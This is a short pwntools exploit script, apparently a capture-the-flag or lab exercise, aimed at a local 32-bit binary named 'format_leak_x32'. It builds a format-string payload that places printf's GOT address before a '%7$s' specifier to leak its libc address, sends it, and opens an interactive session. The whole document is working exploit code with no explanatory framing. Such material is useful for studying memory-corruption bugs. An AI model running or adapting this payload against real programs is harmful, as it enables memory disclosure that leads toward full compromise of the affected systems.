from pwn import*
context.log_level = 'debug'
o = process("./format_leak_x32")
elf = ELF("./format_leak_x32")
printf_got = elf.got['printf']
payload = p32(printf_got) + b"%7$s"
o.sendline(payload)
o.interactive()